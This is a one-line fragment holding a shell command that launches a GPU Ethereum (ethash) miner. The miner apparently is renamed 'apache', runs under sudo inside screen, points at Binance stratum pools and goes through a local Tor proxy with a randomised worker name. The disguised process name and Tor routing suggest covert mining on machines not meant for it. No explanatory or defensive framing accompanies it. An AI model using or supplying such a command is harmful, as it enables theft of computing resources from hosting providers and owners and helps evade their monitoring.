...
screen sudo ./apache -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -o stratum+tcp://ethash.poolbinance.com:443 -p x --proxy 127.0.0.1:9050 -u teguhcong -w $(echo $(shuf -i 1-2000 -n 1)) --gpu-report-interval 5 --mt 1
